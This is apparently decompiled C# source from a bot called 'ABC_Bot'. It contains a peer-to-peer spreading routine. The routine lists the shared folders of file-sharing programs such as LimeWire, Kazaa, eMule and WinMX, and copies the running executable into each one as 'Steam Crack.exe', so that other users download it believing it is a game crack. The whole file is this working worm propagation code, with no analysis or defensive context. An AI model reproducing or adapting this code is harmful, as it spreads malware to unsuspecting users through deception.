using System;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ABC_Bot;

[StandardModule]
internal sealed class mod_p2p
{
	public static object s_p2p()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		List<string> list = default(List<string>);
		int num2 = default(int);
		int num3 = default(int);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string current = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					list = new List<string>();
					goto IL_0009;
				case 504:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0026;
						case 4:
							goto IL_0043;
						case 5:
							goto IL_0060;
						case 6:
							goto IL_007d;
						case 7:
							goto IL_009a;
						case 8:
							goto IL_00b7;
						case 9:
							goto IL_00d4;
						case 10:
							goto IL_00f2;
						case 11:
							goto IL_0110;
						case 12:
							goto IL_012e;
						case 13:
							goto IL_014c;
						case 14:
							goto IL_0161;
						case 15:
							goto IL_016a;
						case 16:
							goto IL_0183;
						default:
							goto end_IL_0000;
						case 17:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0161:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_016a;
					IL_0183:
					num = 16;
					goto IL_0187;
					IL_0009:
					num = 2;
					list.Add(Interaction.Environ("programfiles") + "\\LimeWire\\Shared\\");
					goto IL_0026;
					IL_0026:
					num = 3;
					list.Add(Interaction.Environ("programfiles") + "\\eDonkey2000\\incoming\\");
					goto IL_0043;
					IL_0043:
					num = 4;
					list.Add(Interaction.Environ("programfiles") + "\\kazaa\\my shared folder\\");
					goto IL_0060;
					IL_0060:
					num = 5;
					list.Add(Interaction.Environ("programfiles") + "\\kazaa lite\\my shared folder\\");
					goto IL_007d;
					IL_007d:
					num = 6;
					list.Add(Interaction.Environ("programfiles") + "\\kazaa lite k++\\my shared folder\\");
					goto IL_009a;
					IL_009a:
					num = 7;
					list.Add(Interaction.Environ("programfiles") + "\\grokster\\my grokster\\");
					goto IL_00b7;
					IL_00b7:
					num = 8;
					list.Add(Interaction.Environ("programfiles") + "\\emule\\incoming\\");
					goto IL_00d4;
					IL_00d4:
					num = 9;
					list.Add(Interaction.Environ("programfiles") + "\\morpheus\\my shared folder\\");
					goto IL_00f2;
					IL_00f2:
					num = 10;
					list.Add(Interaction.Environ("programfiles") + "\\grokster\\my grokster\\");
					goto IL_0110;
					IL_0110:
					num = 11;
					list.Add(Interaction.Environ("programfiles") + "\\tesla\\files\\");
					goto IL_012e;
					IL_012e:
					num = 12;
					list.Add(Interaction.Environ("programfiles") + "\\winmx\\shared\\");
					goto IL_014c;
					IL_014c:
					num = 13;
					enumerator = list.GetEnumerator();
					goto IL_0187;
					IL_0187:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_0161;
					}
					((IDisposable)enumerator).Dispose();
					goto end_IL_0000_2;
					IL_016a:
					num = 15;
					File.Copy(Application.get_ExecutablePath(), current + "Steam Crack.exe");
					goto IL_0183;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 504;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}
}
